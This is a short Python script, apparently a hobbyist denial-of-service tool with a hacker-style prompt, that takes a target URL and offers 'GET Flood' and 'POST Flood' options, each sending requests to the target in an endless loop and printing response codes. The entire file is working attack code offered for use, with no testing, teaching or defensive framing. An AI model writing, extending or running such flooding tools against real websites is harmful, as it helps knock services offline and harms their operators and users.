import requests
import os

menu = """
[1] GET Flood
[2] POST Flood
[0] EXIT
"""

def main():
    print(f"target >>> {url}")
    print(menu)

    select = input("Gadalka@WE-ARE-FSOCIETY:~$ ")
    if select == "1":
        GetFlood()
    if select == "2":
        PostFlood()
    if select == "0":
        os._exit(0)

def PostFlood():
    while True:
        response = requests.post(url)
        if response.status_code == 500:
            print("Response code >", response.status_code)


def GetFlood():
    while True:
        response = requests.get(url)
        if response.status_code == 200:
            print("Response code >", response.status_code)
        else:
            print("failed, response code >", response.status_code)

if __name__ == "__main__":
    url = input("URL > ")
    main()
